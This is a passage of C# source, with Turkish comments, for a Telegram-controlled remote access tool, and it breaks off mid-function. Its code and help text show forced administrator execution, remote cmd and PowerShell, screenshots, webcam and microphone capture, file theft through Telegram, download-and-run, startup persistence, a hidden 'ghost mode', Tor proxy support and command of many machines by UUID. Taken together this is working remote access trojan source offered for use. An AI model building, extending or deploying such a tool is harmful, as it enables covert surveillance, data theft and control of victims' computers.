        ⠨⠀⢀⠀⠈⠀⠂⠀⠀⠂⠀⠠⠁⠀⠠⡈⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣽⣿⣿⣿⡿⠂⠙⢦⡘⢻⣽⣶⣿⣿⣷⡀⠠⠀⢂⠈⢁⣠⣌⢱⡄⢐⠣⡈⠄⣵⡀⡈⠔⠐⠄⠁⠀⠄⠠⠁⠂⠀⠀⠀⢀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⡳⠀⢀⠆⠘⡄⠀⠀⡄⢀⠘⠀⠀⠀⠆⢠⣴⣤⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡇⡄⠀⠀⠃⢷⣾⣿⣿⣿⣿⣿⣿⣄⠀⠆⠀⣰⢟⣀⠶⠀⣤⡀⢇⣤⢿⡆⡀⣸⡄⠀⡄⠀⢀⠰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠱⠀⢨⠀⠀⠆⠀⠀⠆⢨⠀⠘⠀⠆⡴⠸⣿⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⠃⢠⡅⣤⠃⠰⠀⠙⣿⣿⣿⣿⣿⣿⣿⡆⠘⠸⠃⠛⠟⠀⡟⢻⣽⣿⠟⠈⣤⢡⡟⠃⠀⡜⠰⠸⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠶⠀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠀⠀⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠈⢀⠠⠀⠈⠀⠒⠀⠀⠀⠀⠂⡃⠈⠔⠄⡩⢁⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠉⣉⣲⠐⠄⠀⡄⢘⢈⠒⡨⢀⡘⠂⡀⢁⠀⠹⣿⣿⣿⣿⣿⣷⡁⠰⣆⠀⠀⠩⢉⢁⢘⠛⠊⡁⠈⠈⠅⢈⢃⠀⠐⠰⠸⡓⢲⡀⠀⠀⠀⠀⠀⢀⠐⠁⠈⡀⢂⠀⡠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠈⠀⡀⠐⠀⢁⣀⠀⡀⢈⠀⠀⠤⠉⠄⠣⠜⢨⡐⢀⢻⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠰⠸⠂⠡⣨⢃⠐⠆⣂⢡⠐⡄⠩⠜⡰⢀⠌⡅⢈⠻⣿⣿⣿⣿⣷⡀⠤⠤⠀⢂⠠⠄⡀⢡⠈⣀⣾⠃⠀⣟⢈⠀⢡⢈⡁⢣⠀⢇⠀⠀⠀⠀⢀⠀⡀⢈⡐⠀⠄⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⢀⠔⢉⠔⢀⠒⠤⢀⠡⠄⢃⠪⠌⡡⢚⢠⣈⠄⣾⣿⣿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠄⠐⢀⠑⡄⢊⡀⢓⡶⢯⠐⠒⠀⠤⠠⣌⠉⠦⠰⡀⢦⡈⠔⢢⠘⢻⣿⣿⣿⣷⡀⠐⠐⠂⠄⢂⠀⠴⣶⠋⣁⢈⠀⣸⢎⠠⣿⡖⢼⡅⢳⡀⢀⠀⠀⠀⡈⠀⠠⠜⠇⠈⠠⠀⡀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⡀⠤⠘⢠⠊⢀⠊⡐⠂⠙⠄⠦⡁⠒⠰⠀⠄⡑⢸⣿⣿⣷⣤⡙⠼⢭⢩⠵⣍⠟⣭⣻⣿⣿⡿⣠⠐⡈⢄⣧⢹⡀⠂⣈⡙⠀⡨⠑⡍⡒⠡⢄⠙⡇⡑⢢⠐⠡⡘⢈⠢⢁⠹⣿⣿⣿⣷⣄⡀⠀⠁⠀⠄⠀⢏⣉⢻⣹⡆⣬⣷⣦⢏⢻⡌⠾⣾⡇⡀⢀⠀⠁⠀⠀⢁⠄⢀⡂⠁⣀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠉⠀⢄⠉⡂⠌⢢⠀⢂⠌⠁⡌⠠⢐⠉⠠⠉⢡⠀⠀⢿⣿⣿⣿⣿⣿⣶⣧⣾⣴⣯⣾⣿⣿⠏⣠⣿⢷⣈⡼⠿⡁⢣⢁⣬⡁⡖⢁⠲⠇⡐⢃⣼⡇⢰⠠⠡⢌⡑⢠⠈⠩⠑⢄⠈⣿⣿⣿⣿⣦⡢⢀⠂⠉⠷⣽⣿⣰⣮⡹⣦⠘⢷⣯⣰⣿⡄⢻⢷⢻⠀⣧⠀⢀⠀⠀⡀⠄⠀⠄⡈⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠈⡄⠠⢉⠔⡠⠜⠠⢌⠂⠤⢁⠄⠂⡁⠡⠀⠀⠀⠀⡇⣬⢛⠻⠿⣿⣿⣿⡿⣿⣷⡿⡟⣶⣹⢏⣼⣿⢃⡒⡒⢯⢠⢑⡀⠜⡤⣨⣁⠆⢟⡁⢺⠻⡀⠇⠤⠐⠄⠂⠅⠣⠐⠆⡈⢿⣿⣿⣿⣿⡂⠠⣀⢴⣖⢹⠽⠋⢿⣇⣷⡞⢿⣳⠌⠹⠆⡈⢸⡜⢙⠀⠈⠀⠀⠙⢁⠀⣤⠀⢌⠢⣀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠂⡄⢁⠢⠁⠴⠈⠖⠢⠌⠴⠠⠐⠦⠐⠀⠒⠀⠂⢸⢃⠣⣌⡃⡒⠐⣠⣿⣿⣿⣟⣻⣯⣭⢊⣻⣯⣦⠒⢇⡑⢺⡤⢦⣅⡎⣜⡳⡉⡷⢷⡿⢃⣒⣃⣒⣒⣁⣊⣑⢂⡒⣈⢄⡠⢙⣿⣿⣿⣿⣷⣜⢿⠿⣿⠆⣀⢊⢡⣿⣾⣿⢜⣫⠉⣼⣮⣿⡈⠹⢾⡄⢁⢀⡀⣀⠀⣶⣧⣧⡈⠐⠀⠇⢀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⣀⣀⣀⣀⣈⣉⣈⣩⣥⣦⣤⢦⢭⣤⢭⣉⣏⡭⣭⣡⣬⣧⣓⡌⡃⢌⣰⣿⡿⠿⢿⣺⣿⣯⣿⣧⣼⡿⣝⡟⣈⣤⢋⠗⣠⣤⡴⣼⠷⣯⢿⠧⡞⣧⢥⢦⡴⣌⣰⢤⡬⠄⣁⡠⠂⠂⢉⣿⣿⣿⣿⣿⣿⣆⡯⡽⠛⣁⠤⢤⢽⠾⣿⣯⣿⣿⣿⣿⡛⡏⠷⣽⠃⡒⠀⠀⡀⠰⡼⠿⠿⠿⠿⠶⣦⠤⠀⢀⠠⠈⠀⠁⠄⠠⠀⠄⠀⠀⠀⠄⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⢉⢐⣢⣭⣫⣛⣛⣭⣭⣽⡼⡭⠾⠤⠷⠼⣴⣎⣳⢛⡼⠮⠿⢟⡛⢟⡳⠶⠿⣿⡿⠿⠻⠿⠷⡿⢻⡿⣧⠾⠿⣐⠭⠧⠷⢆⡓⠮⡝⣬⣩⣚⠱⣌⣋⡭⣖⡥⣞⣤⣭⡽⣤⢦⡵⣶⣮⣿⣿⣿⣿⣿⣿⣿⠾⠝⠛⠃⢋⣉⣩⣿⣿⣿⣿⣿⣿⡏⣿⣥⣶⣡⣷⢶⣶⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣈⡀⣀⣀⣀⣀⣀⣀⣀⡀⣀⠀⣀⢀⡀⣁⢀⡀⢈⡀⣁⡀⣀⡀⠐⠀⠂⠀⠂⠀⠀⠀
        ⠸⠉⢵⣶⣽⠄⢃⠢⢴⣄⣐⣢⣡⣉⣜⣠⣆⠰⠌⠥⢲⣉⣱⢨⡐⠡⠦⠙⠒⠠⠦⠭⠭⠴⠣⠼⠔⣒⠒⢓⣒⠓⡨⢉⣍⣆⣜⠭⠵⠦⠧⠭⠿⠐⠮⣉⣰⢈⠩⡡⢍⡱⠭⢭⠓⡳⠮⠽⠯⠘⡙⢉⣉⣀⣀⣌⡙⢫⠝⣻⣻⢟⡿⣛⣿⡻⢯⣽⣯⣷⣚⣻⣷⣚⣶⣾⠶⠷⢬⣍⠡⠦⠖⠒⢈⣀⣉⣉⣉⣉⣉⣉⣉⡉⢉⠉⡁⠀⠀⠉⠀⠉⠈⠀⠉⠀⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠈⠀
        */

        #region Değişkenler
        static string startupPath = Application.StartupPath + "\\";
        static string appExactPath = "",rea="";
        static string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
        static string userStartupProgramsPath = Path.Combine(appDataPath, @"Microsoft\Windows\Start Menu\Programs\Startup");
        static ITelegramBotClient istemci;
        static public string proxyType, proxyUrl, proxyPort, proxyUsername, proxyPassword, adminUserID, botToken, resolveHostnamesLocally;
        static public bool logMessages = false;
        static public volatile bool hasLicense;
        static List<string> value = new List<string> { };
        static bool botReset = false;
        static string exampleConfigFile = "if_used_select_one_value_disabled_socks5_http\nif_used_use_one_https://example.org_socks5://127.0.0.1\nif_used_proxy_port_like_8080\nempty_proxy_username\nempty_proxy_password\nadmin_paste_userid\nbot_paste_token\nresolve_hostnameslocally_true_false";
        static HttpClient httpClient = new HttpClient();
        static Uri userIDUrl = new Uri("https://raw.githubusercontent.com/removed/removedlicensecheck/main/whitelist");
        static public TimeSpan delayTime = TimeSpan.FromSeconds(1);
        static public volatile bool delay=false;
        static string uuid = null;
        private static readonly Random _random = new Random();

        Form1 form1 = new Form1();
        static string hakkinda = "Hızlı Kullanımı:\r\nBotunuzu botfatherden oluşturup ilgili bilgileri token sekmesine girin. Eğer gruptan kullanmak istiyorsanız, botunuzu gruba ekleyin, admin yetkisi ve mesajlara erişim verin. Eğer sadece bota mesaj atarak kullanmak istiyorsanız, botfatherdan Botunuzun gruba eklenmesini kapatın. TelegramUserID'nizi lisans sekmesine girin. Programı yeniden başlatın. Eğer Telegram User Id değerinizi bilmiyorsanız Telegramdan bota /userid yazın ve Telegram User Id sayınızı öğrenin. Daha sonra token sekmesine bu bilgiyi girin ve duruma göre kaydedin veya değiştirin. Botu yeniden başlatın. \r\n\r\nTelegram komutları:\r\n\r\n/menu, /key, /menü\r\nKomut menüsünü açar.\r\n\r\n/ss\r\nBilgisayara bağlı tüm monitörlerden ekran alıntısı alır ve size resim olarak yollar.\r\n\r\n/cmd \"komut\"\r\nKomut satırında yazılan komutu yönetici olarak çalıştırır. Sonucunu size yazı olarak mesaj atar.\r\n\r\n/ps \"komut\"\r\nPower shellde yazılan komutu yönetici olarak çalıştırır. Sonucu size yazı olarak mesaj atar.\r\n\r\n/log\r\nSohbette yazılan mesajları yazı olarak log.txt dosyasına kaydeder. İlk yazıldığında etkinleşir. Tekrar yazıldığında devre dışı bırakılır. Botta oluşan hata mesajlarını bu şekilde görebilirsiniz.\r\n\r\n/ip\r\nBilgisayara bağlı olan ağ kartlarının özelliklerini ve ip adreslerini atar.\r\n\r\nÖrnek:\r\n\r\nAdapter Name: Wi-Fi\r\nDESC:TP-Link Wireless USB Adapter\r\nGUID:{AWD3VAWD-AW1EDAW-AW2AWDA-3WDAWDWD}\r\nMAC:C0:08:C5:DD:FF:GG:EE\r\nYerel Ağ IP:192.168.1.128\r\nİnternet IP: 96.125.222.76\r\n\r\n/video, /video 5\r\nBilgisayarın ana ekranını video ve medya ve sistem sesleri olarak 60 saniye boyunca kaydeder. Size video olarak atar. Sonuna 5 sayısını eklerseniz üst üste 5 defa 60 saniyelik yani toplamda 5 dakikalık kayıt alıp video olarak mesaj atar. Bu sürede bota mesaj atmayın. Bu süre zarfında bota atılan mesajlar komut bittikten sonra çalıştırılır.\r\n\r\n/audio, /audio 5, /ses, /ses 5\r\nBilgisayara takılı bir mikrofon yoksa size bunu mesaj olarak belirtir. Eğer takılı bir mikrofon varsa 60 saniye boyunca kaydeder. Size ses dosyası olarak atar. Sonuna 5 sayısı eklerseniz üst üste 5 defa 60 saniyelik yani toplamda 5 dakikalık kayıt alıp video olarak mesaj atar. Bu sürede bota mesaj atmayın. Bu süre zarfında bota atılan mesajlar komut bittikten sonra çalıştırılır.\r\n\r\n/webcam, /cam, /snap, /foto, /fotoğraf\r\nBilgisayara takılı bir kamera yoksa size bunu mesaj olarak belirtir. Eğer takılı bir kamera varsa bir fotoğraf çeker. Size fotoğraf olarak atar.\r\n\r\n/camvideo, /recordvideo, /capvid, /cv, /cv 5\r\nBilgisayara takılı bir kamera yoksa size bunu mesaj olarak belirtir. Eğer takılı bir kamera varsa 60 saniye boyunca bu kameradan (varsa) mikrofonla birlikte video kaydeder. Size video dosyası olarak atar. Sonuna 5 sayısı eklerseniz üst üste 5 defa 60 saniyelik yani toplamda 5 dakikalık kayıt alıp video olarak mesaj atar. Bu sürede bota mesaj atmayın. Bu süre zarfında bota atılan mesajlar komut bittikten sonra çalıştırılır.\r\n\r\n/start C:\\ABC.EXE\r\nDosya yolu verilen programı arka planda çalıştırır.\r\n\r\n/starto C:\\ABC.EXE\r\nDosya yolu verilen programı ön planda çalıştırır.\r\n\r\n/kill program_adi\r\nAdı verilen program eğer çalışıyorsa programı sonlandırır. (sonuna nokta ya da exe uzantısını eklemeyin. )\r\n\r\n/download https:\\\\siteadi.com\\metin_dosyasi.txt\r\nLinki verilen programı, linkten program adını ayırarak indirir. Daha sonra aynı program adı ile botun çalıştığı dizine kaydeder.\r\n\r\n/upload C:\\ABC.EXE \r\nDosya yolu verilen dosyayı (50 MB aşmamak kaydı ile) Telegrama yükleyerek size mesaj olarak atar. Exe dosyası olması gerekmiyor tek bir dosya olduğu sürece uzantısı farketmeden atabilirsiniz.\r\n\r\n/add logon\r\nBotun şu anki çalışan kullanıcı hesabında her oturum açıldığında bot otomatik başlar. (İnternet yoksa başlamayabilir.)\r\n\r\n/remove logon\r\nBotun şu anki çalışan kullanıcı hesabında her oturum açıldığında bot otomatik başlaması özelliğini kapatır.\r\n\r\n/add start\r\nBotun bilgisayar her açıldığında otomatik başlar. (İnternet yoksa başlamayabilir.)\r\n\r\n/remove start\r\nBotun bilgisayar her açıldığında otomatik başlaması özelliğini kapatır.\r\n\r\n/lic,\r\nLisans durumunuzu kontrol eder.\r\n\r\n/ghoston\r\nKalıcı olarak Hayalet Modu açılır. Sistem tepsisindeki simge gizlenir.\r\n\r\n/ghostoff\r\nKalıcı olarak Hayalet Modu kapatılır. Sistem tepsisindeki simge yeniden gösterilir.\r\n\r\n/uuid gen\r\nBilgisayara 10 karakter ve rakam karışık bir uuid değeri oluşturur.\r\n\r\n/uuid clear uuid_değeri\r\nBilgisayarın uuid değerini kaldırır.\r\n\r\n/uuid get\r\nBilgisayarın uuid değerini görüntüler.\r\n\r\n/uuid set ABCDEF\r\nBilgisayarın uuid değerini ABCDEF olarak ayarlar.\r\n\r\n/uuid uuid_değeri /ss\r\nUuid değeri eşleşen bilgisayarda /ss komutunu çalıştırır. /ss yerine farklı komutlar kullanabilirsiniz.\r\n\r\n/updateonline\r\n\r\n/updateoffline\r\n\r\n/updatekb\r\n/updatekb KB12345 şeklinde kullanılır ve sisteminiz için eşleşen bir güncelleme bulunursa yüklenir.\r\n\r\n/exit\r\nBilgisayarda çalışan botu kapatır. Tekrar bilgisayarın yanına gidip çalıştırmanız gerekir.";
        #endregion
        
        public bootUp() {
            #region Programı yönetici olarak çalıştır
            runAsAdministrator();
            #endregion
            #region Unique User Identification Atanmışsa Oku (Toplu cihazlara tekil komut yollayabilmek için)
            if (System.IO.File.Exists("./uuid"))
            {
                try
                {
                    uuid = System.IO.File.ReadAllText("./uuid");
                }
                catch (Exception)
                {
                    uuid = null;
                }
            }
            #endregion
            #region Ayar dosyası olan config.txt yoksa, örnek dosya yapalım.
            if (!System.IO.File.Exists("./config.txt"))
            {
                System.IO.File.WriteAllText("./config.txt",contents: exampleConfigFile);
                MessageBox.Show("config.txt dosyası bulunamadığı için oluşturuldu.\nBu dosyaya doğru değerleri girdikten sonra botu yeniden başlatın.\nadminUserID ve bot token harici hiçbir değer zorunlu değildir.\nLakin satır sırasını karıştırmayın.\nProxy kullanmıyorsanızda disabled olarak kalsın.");
                Environment.Exit(0);
            }
            #endregion
            #region Ayar dosyası olan config.txt değerlerini oku, yanlışsa yeniden oluştur.
            else if (System.IO.File.Exists("./config.txt"))
            {
                using (StreamReader reader = new StreamReader("./config.txt"))
                {
                    string line;
                    while ((line = reader.ReadLine()) != null)
                        value.Add(line);
                    proxyType = value[0].ToString().Trim();
                    proxyUrl = value[1].ToString().Trim();
                    proxyPort = value[2].ToString().Trim();
                    proxyUsername = value[3].ToString();
                    proxyPassword = value[4].ToString();
                    adminUserID = value[5].ToString().Trim();
                    botToken = value[6].ToString().Trim();
                    resolveHostnamesLocally = value[7].ToString().Trim();
                }
                if (value.Count != 8)
                {
                    System.IO.File.Delete("./config.txt");
                    System.IO.File.WriteAllText("./config.txt", exampleConfigFile);
                    MessageBox.Show($"{value.Count} config.txt dosyası hatalı olduğu için yeniden oluşturuldu.\nBu dosyaya doğru değerleri girdikten sonra botu yeniden başlatın.\nadminUserID ve bot token harici hiçbir değer zorunlu değildir.\nLakin satır sırasını karıştırmayın.\nProxy kullanmıyorsanızda disabled olarak kalsın.");
                    //Environment.Exit(0);
                    using (StreamReader reader = new StreamReader("./config.txt"))
                    {
                        string line;
                        while ((line = reader.ReadLine()) != null)
                            value.Add(line);
                        proxyType = value[0].ToString().Trim();
                        proxyUrl = value[1].ToString().Trim();
                        proxyPort = value[2].ToString().Trim();
                        proxyUsername = value[3].ToString();
                        proxyPassword = value[4].ToString();
                        adminUserID = value[5].ToString().Trim();
                        botToken = value[6].ToString().Trim();
                        resolveHostnamesLocally = value[7].ToString().Trim();
                    }
                }

                if (botToken == null || botToken == "" || botToken == " " || botToken == "bot_paste_token")
                {
                    //form1.Show();
                    MessageBox.Show($"config.txt dosyasında bot token yok! Botfatherden botunuzu oluşturduktan sonra config dosyasına ekleyin.");
                    //Form1 f = new Form1();
                    //f.Show();
                    if (!Application.OpenForms.OfType<Form1>().Any())
                    {
                        Form form1 = new Form1(); // Your main form
                        form1.FormClosed += MainForm_FormClosed;
                        form1.Show();
                        form1.WindowState = FormWindowState.Normal;
                        form1.Focus();
                        form1.Activate();
                        //form1.WindowState = FormWindowState.Normal;
                    }
                    else if (Application.OpenForms.OfType<Form1>().Any())
                    {
                        Form1 f1 = Application.OpenForms["Form1"] as Form1;
                        f1.Show();
                        f1.WindowState = FormWindowState.Normal;
                        f1.Focus();
                        f1.Activate();

                    }
                    //return;
                    //Environment.Exit(0);
                }
                try
                {
                    if (System.IO.File.Exists("./delay.txt"))
                    {
                        using (StreamReader reader = new StreamReader("./delay.txt"))
                        {
                            string line;
                            while ((line = reader.ReadLine()) != null)
                                delayTime = TimeSpan.FromSeconds(Convert.ToInt32(line.ToString().Trim()));
                            delay = true;
                        }
                        if (value.Count != 1)
                        {
                            System.IO.File.Delete("./delay.txt");
                            delay = false;
                        }
                    }
                }
                catch (Exception ex)
                {
                    if (logMessages)
                        MessageBox.Show(ex.ToString());
                }
            }
            #endregion
            #region Proxy tipi belirleme ve kullanma (disabled, http, socks5) Socks5 ile Tor proxy kullanabilmeniz lazım.
            if (proxyType == "disabled" || proxyType == "if_used_select_one_value_disabled_socks5_http")
            {
                try
                {
                    istemci = new TelegramBotClient(botToken);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"{ex}");
                    //Environment.Exit(0);
                }
            }
            else if (proxyType == "http")
            {
                System.Net.WebProxy webProxy = new System.Net.WebProxy(Host: proxyUrl, Port: Convert.ToInt32(proxyPort))
                {
                    Credentials = new NetworkCredential(proxyUsername, proxyPassword)
                };
                HttpClient httpClient = new HttpClient(new HttpClientHandler { Proxy = webProxy, UseProxy = true, });
                istemci = new TelegramBotClient(botToken, httpClient);
            }
            else if (proxyType == "socks5")
            {
                HttpToSocks5Proxy proxy = null;
                if (proxyUsername == "empty_proxy_username" || proxyPassword == "empty_proxy_password")
                    proxy = new HttpToSocks5Proxy(proxyUrl, Convert.ToInt32(proxyPort));
                else if (proxyUsername != "" && proxyPassword != "")
                    proxy = new HttpToSocks5Proxy(proxyUrl, Convert.ToInt32(proxyPort), proxyUsername, proxyPassword);
                if (proxy == null)
                {
                    System.IO.File.Delete("./config.txt");
                    System.IO.File.WriteAllText("./config.txt", exampleConfigFile);
                    MessageBox.Show("config.txt dosyası hatalı olduğu için yeniden oluşturuldu.\nBu dosyaya doğru değerleri girdikten sonra botu yeniden başlatın.\nadminUserID ve bot token harici hiçbir değer zorunlu değildir.\nLakin satır sırasını karıştırmayın.\nProxy kullanmıyorsanızda disabled olarak kalsın.");
                    Environment.Exit(0);
                }
                else if (proxy != null)
                {
                    if (resolveHostnamesLocally == "true")
                        proxy.ResolveHostnamesLocally = true;
                    else proxy.ResolveHostnamesLocally = false;
                }
                HttpClient httpClient = new HttpClient(new HttpClientHandler { Proxy = proxy, UseProxy = true, });
                istemci = new TelegramBotClient(botToken, httpClient);
            }
            else
            {
                try
                { istemci = new TelegramBotClient(botToken); }
                catch (Exception ex)
                {
                    MessageBox.Show($"{ex}");
                    //Environment.Exit(0);
                }
            }
            #endregion
            if (!Application.OpenForms.OfType<Form1>().Any())
            {
                Form form1 = new Form1(); // Your main form
                form1.FormClosed += MainForm_FormClosed;
                form1.Show();
                form1.WindowState = FormWindowState.Normal;
                form1.Focus();
                form1.Activate();
                if (botToken != null && botToken != "" && botToken != " " && botToken != "bot_paste_token")
                {
                    form1.WindowState = FormWindowState.Minimized;
                    form1.Hide();
                }
            }
            else if (Application.OpenForms.OfType<Form1>().Any())
            {
                Form1 f1 = Application.OpenForms["Form1"] as Form1;
                f1.Show();
                f1.WindowState = FormWindowState.Normal;
                f1.Focus();
                f1.Activate();
                if (botToken != null && botToken != "" && botToken != " " && botToken != "bot_paste_token")
                {
                    f1.WindowState = FormWindowState.Minimized;
                    f1.Hide();
                }

            }
            try
            {
                if (logMessages) log("Uygulama hata ayıklama modu ile başlatıldı!\nBu modda bilgisayar ekranında bazı mesajlar belirebilir.\nFonksiyonlar çalışırken uyarılar ve MessageBoxlar gelebilir!");
            }
            catch (Exception)
            {
                //MessageBox.Show(ex.ToString());
            }
            try{/*licenseQuery();*/
                #pragma warning disable CS4014 // Beklemeyelim
                                checkUserIDLicense(adminUserID);
                #pragma warning restore CS4014 // Beklemeyelim

            }
            catch (Exception ex){ MessageBox.Show(ex.ToString()); }
            if (botToken != null)
            {
                try
                {startBot();}
                catch (Exception){ MessageBox.Show("Bot tokeniniz yanlış!"); }
            }
        }
        public static void botReconfigure()
        {
            value.Clear();
            #region Unique User Identification Atanmışsa Oku (Toplu cihazlara tekil komut yollayabilmek için)
            if (System.IO.File.Exists("./uuid"))
            {
                try
                {
                    uuid = System.IO.File.ReadAllText("./uuid");
                }
                catch (Exception)
                {
                    uuid = null;
                }
            }
            #endregion
            #region Ayar dosyası olan config.txt yoksa, örnek dosya yapalım.
            if (!System.IO.File.Exists("./config.txt"))
            {
                System.IO.File.WriteAllText("./config.txt", contents: exampleConfigFile);
                MessageBox.Show("config.txt dosyası bulunamadığı için oluşturuldu.\nBu dosyaya doğru değerleri girdikten sonra botu yeniden başlatın.\nadminUserID ve bot token harici hiçbir değer zorunlu değildir.\nLakin satır sırasını karıştırmayın.\nProxy kullanmıyorsanızda disabled olarak kalsın.");
                //Environment.Exit(0);
            }
            #endregion
            #region Ayar dosyası olan config.txt değerlerini oku, yanlışsa yeniden oluştur.
            else if (System.IO.File.Exists("./config.txt"))
            {
                using (StreamReader reader = new StreamReader("./config.txt"))
                {
                    string line;
                    while ((line = reader.ReadLine()) != null)
                        value.Add(line);
                    proxyType = value[0].ToString().Trim();
                    proxyUrl = value[1].ToString().Trim();
                    proxyPort = value[2].ToString().Trim();
                    proxyUsername = value[3].ToString();
                    proxyPassword = value[4].ToString();
                    adminUserID = value[5].ToString().Trim();
                    botToken = value[6].ToString().Trim();
                    resolveHostnamesLocally = value[7].ToString().Trim();
                }
                if ((value.Count != 8)&&(value.Count!=9))
                {
                    System.IO.File.Delete("./config.txt");
                    System.IO.File.WriteAllText("./config.txt", exampleConfigFile);
                    MessageBox.Show($"{value.Count} config.txt dosyası hatalı olduğu için yeniden oluşturuldu.\nBu dosyaya doğru değerleri girdikten sonra botu yeniden başlatın.\nadminUserID ve bot token harici hiçbir değer zorunlu değildir.\nLakin satır sırasını karıştırmayın.\nProxy kullanmıyorsanızda disabled olarak kalsın.");
                    //Environment.Exit(0);
                }
                if (botToken == null || botToken == "" || botToken == " " || botToken == "bot_paste_token")
                {
                    //form1.Show();
                    MessageBox.Show($"config.txt dosyasında bot token yok! Botfatherden botunuzu oluşturduktan sonra config dosyasına ekleyin.");
                    //Form1 f = new Form1();
                    //f.Show();
                    if (!Application.OpenForms.OfType<Form1>().Any())
                    {
                        Form form1 = new Form1(); // Your main form
                        form1.Show();
                        form1.WindowState = FormWindowState.Normal;
                        form1.Focus();
                        form1.Activate();
                        //form1.WindowState = FormWindowState.Normal;
                    }
                    else if (Application.OpenForms.OfType<Form1>().Any())
                    {
                        Form1 f1 = Application.OpenForms["Form1"] as Form1;
                        f1.Show();
                        f1.WindowState = FormWindowState.Normal;
                        f1.Focus();
                        f1.Activate();

                    }
                    //return;
                    //Environment.Exit(0);
                }
                try
                {
                    if (System.IO.File.Exists("./delay.txt"))
                    {
                        using (StreamReader reader = new StreamReader("./delay.txt"))
                        {
                            string line;
                            while ((line = reader.ReadLine()) != null)
                                delayTime = TimeSpan.FromSeconds(Convert.ToInt32(line.ToString().Trim()));
                            delay = true;
                        }
                        if (value.Count != 1)
                        {
                            System.IO.File.Delete("./delay.txt");
                            delay = false;
                        }
                    }
                }
                catch (Exception ex)
                {
                    if (logMessages)
                        MessageBox.Show(ex.ToString());
                }
            }
            #endregion
            #region Proxy tipi belirleme ve kullanma (disabled, http, socks5) Socks5 ile Tor proxy kullanabilmeniz lazım.
            if (proxyType == "disabled" || proxyType == "if_used_select_one_value_disabled_socks5_http")
            {
                try
                {
                    istemci = new TelegramBotClient(botToken);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"{ex}");
                    //Environment.Exit(0);
                }
            }
            else if (proxyType == "http")
            {
                System.Net.WebProxy webProxy = new System.Net.WebProxy(Host: proxyUrl, Port: Convert.ToInt32(proxyPort))
                {
                    Credentials = new NetworkCredential(proxyUsername, proxyPassword)
                };
                HttpClient httpClient = new HttpClient(new HttpClientHandler { Proxy = webProxy, UseProxy = true, });
                istemci = new TelegramBotClient(botToken, httpClient);
            }
            else if (proxyType == "socks5")
            {
                HttpToSocks5Proxy proxy = null;
                if (proxyUsername == "empty_proxy_username" || proxyPassword == "empty_proxy_password")
                    proxy = new HttpToSocks5Proxy(proxyUrl, Convert.ToInt32(proxyPort));
                else if (proxyUsername != "" && proxyPassword != "")
                    proxy = new HttpToSocks5Proxy(proxyUrl, Convert.ToInt32(proxyPort), proxyUsername, proxyPassword);
                if (proxy == null)
                {
                    System.IO.File.Delete("./config.txt");
